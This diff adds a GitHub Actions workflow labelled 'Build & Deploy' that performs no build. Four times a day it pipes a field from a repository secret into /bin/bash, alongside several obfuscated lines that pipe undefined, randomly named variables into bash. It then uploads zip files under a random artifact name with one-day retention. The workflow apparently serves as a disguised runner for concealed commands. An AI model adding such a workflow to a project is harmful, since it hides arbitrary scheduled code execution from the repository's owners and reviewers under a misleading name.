@@ -1,0 +1,33 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          a94: ${{ secrets.a94 }}
+        run: |
+          printf '%s' "$a94" | jq -r .mznt097 | /bin/bash
+          echo $isife277 | jq -r .ydoz7 | /bin/bash
+          printf '%s' "$feww091" | jq -r .lz6 | /bin/bash
+          echo $cijmm09 | jq -r .d9 | /bin/bash
+          printf '%s' "$hojt8" | jq -r .mbvt2018 | /bin/bash
+          echo $yjk64215 | jq -r .ghbn466 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: w80czUOl
+          path: "*.zip"
+          retention-days: 1
